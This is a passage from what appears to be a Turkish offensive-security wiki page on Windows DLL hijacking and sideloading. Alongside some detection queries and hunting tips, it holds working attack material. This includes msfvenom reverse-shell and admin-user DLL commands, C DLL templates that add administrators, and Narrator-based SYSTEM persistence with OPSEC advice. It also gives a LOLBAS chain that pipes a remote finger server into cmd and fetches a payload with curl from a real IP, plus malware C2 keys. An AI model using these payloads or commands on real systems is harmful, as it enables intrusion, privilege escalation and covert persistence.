- **`<bypassTrustedAppStrongNames enabled="true"/>`**, strong-name doğrulama hatası oluşmadan tam güvenli bir uygulamanın imzasız veya değiştirilmiş assembly'leri yüklemesini sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher policy'nin daha yeni assembly'lere yönlendirme yapmasını önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle dikkat çekicidir; implantın bellekte `EtwEventWrite` işlevine yama uygulaması yerine, CLR kendi ETW görünürlüğünü yapılandırma üzerinden devre dışı bırakır.

Yakın tarihli kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı görünen bir **AppData update** klasörüne kopyalar, ana bilgisayarın adını `update.exe` gibi bir adla değiştirir ve bir **zamanlanmış görev** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export'unu yüklemeden önce yürütme bağlamını doğrular (örneğin, Task Scheduler'dan beklenen üst sürecin `svchost.exe` olması).

Avlama fikirleri:
- Kullanıcıların yazabildiği konumlarda şüpheli, bitişik **`.config`** dosyalarıyla çalışan, imzalı veya başka şekilde meşru **.NET yürütülebilir dosyaları**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update ikili dosyalarını **`%LOCALAPPDATA%`** veya uygulamaya özel `\bin\update\` dizinlerinden başlatan zamanlanmış görevler.
- Zamanlanmış bir görevin güvenilir bir .NET ana bilgisayarını başlattığı ve bu ana bilgisayarın hemen kendi dizinindeki, satıcıya ait olmayan assembly'leri yüklediği üst/alt süreç zincirleri.

#### Windows belgelerinde DLL arama sırasına ilişkin istisnalar

Windows belgelerinde standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Belleğe önceden yüklenmiş bir DLL ile **aynı ada sahip bir DLL** bulunduğunda sistem olağan aramayı atlar. Bunun yerine, bellekteki DLL'ye dönmeden önce yönlendirme ve manifest kontrolü yapar. **Bu senaryoda sistem DLL'yi aramaz**.
- DLL, geçerli Windows sürümü için **bilinen bir DLL** olarak tanınıyorsa sistem, arama sürecini **atlayarak** bilinen DLL'nin kendi sürümünü ve bağımlı DLL'lerini kullanır. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarı, bu bilinen DLL'lerin listesini tutar.
- Bir **DLL'nin bağımlılıkları** varsa, bu bağımlı DLL'ler ilk DLL tam yoluyla tanımlanmış olsa bile yalnızca **modül adlarıyla** belirtilmiş gibi aranır.

### Yetkileri Yükseltme

**Gereksinimler**:

- (Yatay veya yanal hareket kapsamında) **farklı yetkilerle** çalışan veya çalışacak ve **DLL'si eksik** olan bir süreç belirleyin.
- **DLL'nin** aranacağı **herhangi bir dizine** yazma erişiminizin olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Bu ön koşullar varsayılan olarak nadir görülür: yetkili yürütülebilir dosyaların genellikle eksik DLL bağımlılıkları olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Ancak hatalı yapılandırılmış ortamlar her iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesine göz atın. Temel amacı UAC bypass olsa da belirli Windows sürümlerine yönelik ve bulduğunuz yazılabilir dizine uyarlanabilen DLL-hijacking PoC'leri içerir.

Bir klasördeki izinlerinizi şu komutla **kontrol edebilirsiniz**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın import'larını ve bir DLL'in export'larını da şu şekilde kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

System PATH klasöründe yazma izinleriniz varsa, **DLL Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** hakkında tam kılavuz için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), System PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu güvenlik açığını keşfetmek için kullanabileceğiniz diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_ araçlarıdır.

### Örnek

İstismar edilebilir bir senaryo bulmanız durumunda, başarılı bir istismar için en önemli şeylerden biri, **çalıştırılabilir dosyanın içe aktaracağı tüm işlevleri dışa aktaran bir dll oluşturmak** olacaktır. Her durumda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya[ **High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system)**.** yükselmek için kullanışlı olduğunu unutmayın. DLL Hijacking'in çalıştırmaya odaklanan bu incelemesinde **geçerli bir dll oluşturma** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde**, **şablon** olarak kullanabileceğiniz veya **gerekli olmayan işlevleri dışa aktaran bir dll** oluşturmak için kullanabileceğiniz bazı **temel dll kodları** bulabilirsiniz.

## **DLL oluşturma ve derleme**

### **DLL Proxifying**

Temel olarak bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** onun gibi **davranan** ve **çalışan** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçlarıyla bir çalıştırılabilir dosya **belirtip proxify etmek istediğiniz kütüphaneyi seçebilir** ve **proxified dll oluşturabilir** ya da bir **DLL belirtip** **proxified dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir meterpreter (x86) edinin:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendinizinki

Birçok durumda, derlediğiniz DLL **kurban sürecin içe aktardığı tüm işlevleri dışa aktarmalıdır**. Gerekli bir dışa aktarma eksikse, binary bunu çözüme kavuşturamaz ve exploit başarısız olur.

<details>
<summary>C DLL şablonu (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Thread giriş noktasına sahip alternatif C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### Export tetiklemeli başlatma kullanan NativeAOT DLL

Bağımsız **.NET NativeAOT paylaşımlı kitaplığı**, açıkça `DllMain` uygulamadan yerleştirilen yerel DLL olarak kullanılabilir. `[UnmanagedCallersOnly(EntryPoint = "...")]` ile statik C# yöntemlerini dışa aktarın; yerel ana makine, derleyici tarafından oluşturulan bu giriş noktalarından birini çağırdığında NativeAOT modülü başlatır ve `[ModuleInitializer]` yöntemi, dışa aktarılan C# gövdesinden önce çalışır. Çıktı için ayrıca .NET runtime yüklenmesi gerekmez.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL'nin yine de seçilen ana makinenin gerçekten çağırdığı **dışa aktarma adlarına ve ABI uyumlu imzalara** sahip olması gerekir. Başlatmayı tetiklemek için minimal işlev iskeletleri yeterli olabilir, ancak eksik dışa aktarmalar yüklemeyi engelleyebilir ve yanlış bir imza çağrıyı bozabilir. Ana makinenin içe aktardığı işlevleri listeleyin ve çıktıyı, bağımlılık adıyla yeniden adlandırmadan önce `dumpbin /exports payload.dll` ile doğrulayın.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimal NativeAOT dışa aktarılan DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Projeyi kendi kendine yeterli bir Windows native paylaşımlı kitaplığı olarak yapılandırın:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Yeniden adlandırılmış DLL’yi kopyalanan güvenlik açığı bulunan executable’ın yanına yerleştirin ve uyumlu export’u çağıran code path üzerinden host’u başlatın. Bu initializer yaklaşımı, karmaşık işleri doğrudan `DllMain` içine koymayı önler; ancak sideload ön koşulları değişmez: loader bağımlılığı adına göre çözümlemeli, uygulama dizinini seçmeli ve bağımlılığı önce KnownDLLs, önceden yüklenmiş bir modül, SxS yönlendirmesi veya kısıtlı `LOAD_LIBRARY_SEARCH_*` flag’leri üzerinden karşılamamalıdır.<sup>[[26]](#references)[[30]](#references)</sup>

Geleneksel native şablonlar için [Windows C payloads](../windows-c-payloads.md) sayfasına bakın. Sideload edilen bir first stage daha sonra [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) gerçekleştirebilir; ancak bu, DLL çözümlemenin bir parçası değil, ayrı bir injection tekniğidir.

## Tespit: DLL masquerading ile kütüphane yüklemeleri

Elastic Defend 9.5.0, yüklenen dosya Microsoft tarafından imzalanmamışsa ve dosya adı Elastic’in Windows/system DLL adlarından oluşan önbelleğe alınmış envanterindeki bir adla çakışıyorsa, bir library-load event’ini `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` ile zenginleştirir. Böylece dosya adı envanteri, sistem konumu ve imza analizi endpoint sensor’a taşınır; bu nedenle temel EQL şu şekilde sadeleştirilebilir:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Zenginleştirmeyi tek başına kanıt olarak değil, yüksek değerli bir pivot olarak değerlendirin. İmzalı bir host DLL'yi kendi **kullanıcı tarafından yazılabilir** dizininden yüklediğinde, DLL imzasız/güvenilmeyen olduğunda ve `dll.Ext.relative_file_creation_time` DLL'nin yüklenmeden kısa süre önce oluşturulduğunu gösterdiğinde güven düzeyini artırın. Kapsam dışı bırakma kurallarını tam publisher + host process + installation path ile sınırlandırın; çakışan DLL adlarını genel olarak bastırmayın; çünkü meşru yükleyiciler ve uygulamalar sistemdekilere benzer adlar taşıyan özel kitaplıklar içerebilir.<sup>[[26]](#references)</sup>

Bu zenginleştirmeye sahip olmayan sensörlerde, çakışan DLL adını sistem dışı bir yükleme yolu, Microsoft imzasının bulunmaması/güvenilmeyen olması ve dosya oluşturma ile yükleme arasındaki kısa süreyle ilişkilendirerek davranışı yaklaşık olarak belirleyin. Bunun için güncel tutulan bir DLL adı envanteri ve `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` ile onaylı diğer dağıtım yolları için dar kapsamlı dışlama kuralları gerekir.<sup>[[26]](#references)</sup>

## Örnek Olay: Narrator OneCore TTS Localization DLL Hijack (Erişilebilirlik/AT'ler)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL'yi hâlâ arar; bu DLL, keyfi kod yürütme ve kalıcılık için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Probe path (güncel build'ler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (eski build'ler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path konumunda saldırganın denetimindeki yazılabilir bir DLL varsa, yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path'e yönelik yükleme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naif bir hijack ses çıkarır/UI öğelerini vurgular. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açıp `SuspendThread` ile askıya alın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırmasıyla tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM yürütmesi (yatay hareket)
- Klasik RDP güvenlik katmanına izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana makineye RDP ile bağlanın; oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın. DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapatıldığında yürütme durur—gecikmeden inject/migrate edin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) klonlayıp rastgele bir binary/DLL'ye işaret edecek şekilde düzenleyebilir, içe aktarabilir ve ardından `configuration` değerini bu AT'nin adına ayarlayabilirsiniz. Bu yöntem, Accessibility framework'ü altında rastgele kod yürütülmesini sağlar.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek için admin hakları gerekir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Örnek Olay: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu örnek, Lenovo TrackPoint Quick Menu'deki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** tekniğini gösterir; bu açık **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Güvenlik Açığı Ayrıntıları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Zamanlanmış Görev**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün saat 9:30'da oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu da yerel kullanıcıların istedikleri dosyaları bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeyi dener ve bulunamadığında "NAME NOT FOUND" kaydını yazar; bu, yerel dizinin aramada öncelikli olduğunu gösterir.

### Exploit Uygulaması

Bir saldırgan, eksik DLL'den yararlanarak kullanıcının bağlamında kod yürütmek için aynı dizine kötü amaçlı bir `hostfxr.dll` stub'ı yerleştirebilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin, geçerli kullanıcının bağlamında sabah 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa kötü amaçlı DLL, yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + İmzalı Host Üzerinden DLL Side-Loading (wsc_proxy.exe)

Tehdit aktörleri, yükleri güvenilir ve imzalı bir süreç altında çalıştırmak için MSI tabanlı dropper'ları sıklıkla DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulumu sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript eylemi) ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'yi aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın denetimindeki wsc.dll).
- İmzalı EXE başlatıldığında Windows'un DLL arama sırası, önce çalışma dizinindeki wsc.dll dosyasını yükleyerek saldırganın kodunu imzalı bir üst süreç altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Yürütülebilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
  - Yönetici olarak dışa aktarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Veya lessmsi kullanın: lessmsi x package.msi C:\out
  - VBScript CustomAction tarafından birleştirilip şifresi çözülen birden çok küçük parçayı arayın. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Pratik sideloading: wsc_proxy.exe
- Bu iki dosyayı aynı klasöre koyun:
  - wsc_proxy.exe: meşru, imzalı host (Avast). İşlem, wsc.dll dosyasını kendi dizininde adına göre yüklemeye çalışır.
  - wsc.dll: saldırganın DLL'i. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturup gerekli export'ları gerçek kütüphaneye yönlendirirken payload'ı DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için, payload'ınızı da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary'nin DLL name resolution davranışına dayanır. Host absolute path kullanıyorsa veya safe loading flag'leri (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) etkinse hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export'lar öncelik sırasını etkileyebilir; host binary'yi ve export set'ini seçerken bunları göz önünde bulundurun.

## İmzalı üçlüler + şifrelenmiş payload'lar (ShadowPad vaka incelemesi)

Check Point, Ink Dragon'ın ShadowPad'i meşru yazılımlara benzetirken ana payload'ı diskte şifreli tutmak için **üç dosyalı bir üçlü** kullandığını açıkladı:<sup>[[12]](#references)</sup>

1. **İmzalı host EXE** – AMD, Realtek veya NVIDIA gibi üreticiler kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable'ı Windows binary'si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Kötü amaçlı loader DLL** – beklenen bir adla (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) EXE'nin yanına bırakılır. DLL genellikle ScatterBrain framework'üyle obfuscate edilmiş bir MFC binary'sidir; tek görevi şifrelenmiş blob'u bulmak, şifresini çözmek ve ShadowPad'i reflectively map etmektir.
3. **Şifrelenmiş payload blob'u** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Şifresi çözülmüş payload'ı belleğe map ettikten sonra loader, forensic kanıtları yok etmek için TMP dosyasını siler.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header'daki özgün `OriginalFileName` değerini korurken), üretici imzasını muhafaza edip Windows binary'si gibi görünmesini sağlar. Bu nedenle Ink Dragon'ın `conhost.exe` gibi görünen, gerçekte AMD/NVIDIA yardımcı programları olan binary'leri bırakma alışkanlığını taklit edin.
* Executable güvenilir kaldığından, çoğu allowlisting kontrolü için yalnızca kötü amaçlı DLL'nizin yanına konması yeterlidir. Loader DLL'yi özelleştirmeye odaklanın; imzalı parent genellikle değiştirilmeden çalışabilir.
* ShadowPad'in decryptor'ı, TMP blob'unun loader'ın yanında bulunmasını ve eşlemeden sonra dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyasını güvenle silebilirsiniz.

### LOLBAS stager + aşamalı arşiv sideloading zinciri (finger → tar/curl → WMI)

Operatörler, diskteki tek özel artifact'ın güvenilir EXE'nin yanındaki kötü amaçlı DLL olması için DLL sideloading'i LOLBAS ile birlikte kullanır:<sup>[[1]](#references)</sup>

- **Uzaktan komut loader'ı (Finger):** Gizli PowerShell `cmd.exe /c` başlatır, Finger sunucusundan komutları alır ve `cmd`'ye pipe eder:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`, TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırarak operatörlerin ikinci aşamayı sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Zararsız bir uzantıya sahip arşivi indirin, açın ve sideload hedefini DLL ile birlikte rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme bilgisini gizler ve yönlendirmeleri izler; `tar -xf` Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM ile başlatma:** EXE'yi WMI üzerinden başlatın; böylece telemetride, yanındaki DLL'yi yüklerken CIM tarafından oluşturulmuş bir process görünür:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL’leri tercih eden binary’lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos), güvenilir ad altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` birlikte bulunduğunda `forfiles` için uyarı oluşturun; yönetici betiklerinin dışında yaygın değildir.


## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın zamanda gerçekleşen bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper dağıtmak için güvenilir bir güncelleme zincirini kötüye kullandı. Bu dropper, DLL sideload ve tamamen bellekte çalışan payload’lar hazırladı.<sup>[[13]](#references)</sup>

Operasyon akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` dizinini oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe` dosyasını, kötü amaçlı bir `log.dll` dosyasını ve şifrelenmiş bir `BluetoothService` blob’unu bırakır, ardından EXE’yi başlatır.
- Ana host EXE, `log.dll` dosyasını import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit` blob’u mmap ile yükler; `LogWrite`, özel bir LCG tabanlı akış şifresiyle (sabitler **0x19660D** / **0x3C6EF35F**, önceki bir hash’ten türetilen anahtar materyali) şifresini çözer, buffer’ı düz metin shellcode ile üzerine yazar, geçici verileri serbest bırakır ve shellcode’a atlar.
- IAT kullanmamak için loader, export adlarını **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash’ler, ardından Murmur benzeri bir avalanche (**0x85EBCA6B**) uygular ve salted hedef hash’lerle karşılaştırır.

Ana shellcode (Chrysalis)
- PE benzeri ana modülün şifresini, beş geçiş boyunca `gQ2JR&9;` anahtarıyla add/XOR/sub işlemlerini yineleyerek çözer, ardından import çözümlemesini tamamlamak için `Kernel32.dll` → `GetProcAddress` işlevlerini dinamik olarak yükler.
- DLL ad dizelerini çalışma zamanında karakter başına bit döndürme/XOR dönüşümleriyle yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` dosyalarını yükler.
- **PEB → InMemoryOrderModuleList** üzerinde dolaşan, her export tablosunu Murmur benzeri karıştırma ile 4 baytlık bloklar halinde ayrıştıran ikinci bir resolver kullanır ve yalnızca hash bulunamazsa `GetProcAddress` işlevine geri döner.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının **0x30808** konumunda (boyut **0x980**) bulunur ve RC4 ile `qwhvb^435h&*7` anahtarı kullanılarak şifresi çözülür; böylece C2 URL’si ve User-Agent ortaya çıkar.
- Beacon’lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketi ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısı yapmadan önce `vAuig34%^325hGV` anahtarıyla RC4 şifrelemesi uygular. Yanıtların RC4 şifresi çözülür ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + parçalı aktarım durumları).
